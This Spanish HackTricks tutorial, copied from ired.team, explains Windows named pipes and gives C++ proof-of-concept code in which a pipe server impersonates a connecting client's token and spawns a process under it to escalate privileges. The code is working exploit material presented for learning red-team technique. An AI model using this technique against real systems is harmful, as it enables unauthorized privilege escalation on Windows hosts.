# Impersonación del Cliente de Named Pipe

## Impersonación del Cliente de Named Pipe

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Esta información fue copiada de** [**https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation**](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)

## Visión General

Un `pipe` es un bloque de memoria compartida que los procesos pueden usar para comunicarse e intercambiar datos.

`Named Pipes` es un mecanismo de Windows que permite a dos procesos no relacionados intercambiar datos entre sí, incluso si los procesos se encuentran en dos redes diferentes. Es muy similar a la arquitectura cliente/servidor ya que existen conceptos como `un servidor de named pipe` y un `cliente de named pipe`.

Un servidor de named pipe puede abrir un named pipe con algún nombre predefinido y luego un cliente de named pipe puede conectarse a ese pipe mediante el nombre conocido. Una vez que se establece la conexión, puede comenzar el intercambio de datos.

Este laboratorio se ocupa de un código PoC simple que permite:

* crear un servidor de named pipe tonto de un solo hilo que aceptará una conexión de cliente
* servidor de named pipe para escribir un mensaje simple en el named pipe para que el cliente de pipe pueda leerlo

## Código

A continuación se muestra el PoC tanto para el servidor como para el cliente:

{% tabs %}
{% tab title="namedPipeServer.cpp" %}
```cpp
#include "pch.h"
#include <Windows.h>
#include <iostream>

int main() {
LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
LPVOID pipeBuffer = NULL;
HANDLE serverPipe;
DWORD readBytes = 0;
DWORD readBuffer = 0;
int err = 0;
BOOL isPipeConnected;
BOOL isPipeOpen;
wchar_t message[] = L"HELL";
DWORD messageLenght = lstrlen(message) * 2;
DWORD bytesWritten = 0;

std::wcout << "Creating named pipe " << pipeName << std::endl;
serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
if (isPipeConnected) {
std::wcout << "Incoming connection to " << pipeName << std::endl;
}

std::wcout << "Sending message: " << message << std::endl;
WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);

return 0;
}
```
```markdown
{% endtab %}

{% tab title="namedPipeClient.cpp" %}
```
```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>

const int MESSAGE_SIZE = 512;

int main()
{
LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
HANDLE clientPipe = NULL;
BOOL isPipeRead = true;
wchar_t message[MESSAGE_SIZE] = { 0 };
DWORD bytesRead = 0;

std::wcout << "Connecting to " << pipeName << std::endl;
clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

while (isPipeRead) {
isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
std::wcout << "Received message: " << message;
}

return 0;
}
```
{% endtab %}
{% endtabs %}

## Ejecución

A continuación se muestra el servidor de tubería con nombre y el cliente de tubería con nombre funcionando como se espera:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22.png>)

Vale la pena mencionar que la comunicación de tuberías con nombre por defecto utiliza el protocolo SMB:

![](<../../.gitbook/assets/Screenshot from 2019-04-04 23-51-48.png>)

Comprobando cómo el proceso mantiene un handle a nuestra tubería con nombre `mantvydas-first-pipe`:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (1).png>)

De manera similar, podemos ver al cliente teniendo un handle abierto a la tubería con nombre:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (2).png>)

Incluso podemos ver nuestra tubería con powershell:
```csharp
((Get-ChildItem \\.\pipe\).name)[-1..-5]
```
```markdown
## Suplantación de Token

{% hint style="info" %}
Ten en cuenta que para suplantar el token del proceso cliente necesitas tener (el proceso servidor que crea el pipe) el privilegio de token **`SeImpersonate`**.
{% endhint %}

Es posible que el servidor de named pipe suplante el contexto de seguridad del cliente de named pipe aprovechando una llamada a la API `ImpersonateNamedPipeClient` que a su vez cambia el token del hilo actual del servidor de named pipe por el del token del cliente de named pipe.

Podemos actualizar el código del servidor de named pipe de esta manera para lograr la suplantación - observa que las modificaciones se ven en la línea 25 y siguientes:
```
```cpp
int main() {
LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
LPVOID pipeBuffer = NULL;
HANDLE serverPipe;
DWORD readBytes = 0;
DWORD readBuffer = 0;
int err = 0;
BOOL isPipeConnected;
BOOL isPipeOpen;
wchar_t message[] = L"HELL";
DWORD messageLenght = lstrlen(message) * 2;
DWORD bytesWritten = 0;

std::wcout << "Creating named pipe " << pipeName << std::endl;
serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
if (isPipeConnected) {
std::wcout << "Incoming connection to " << pipeName << std::endl;
}

std::wcout << "Sending message: " << message << std::endl;
WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);

std::wcout << "Impersonating the client..." << std::endl;
ImpersonateNamedPipeClient(serverPipe);
err = GetLastError();

STARTUPINFO	si = {};
wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
PROCESS_INFORMATION pi = {};
HANDLE threadToken = GetCurrentThreadToken();
CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

return 0;
}
```
Ejecutando el servidor y conectándonos a él con el cliente que se ejecuta bajo el contexto de seguridad de administrator@offense.local, podemos ver que el hilo principal del servidor de tubería con nombre asumió el token del cliente de tubería con nombre - offense\administrator, aunque el PipeServer.exe en sí se está ejecutando bajo el contexto de seguridad de ws01\mantvydas. ¿Suena como una buena manera de escalar privilegios?

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras maneras de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
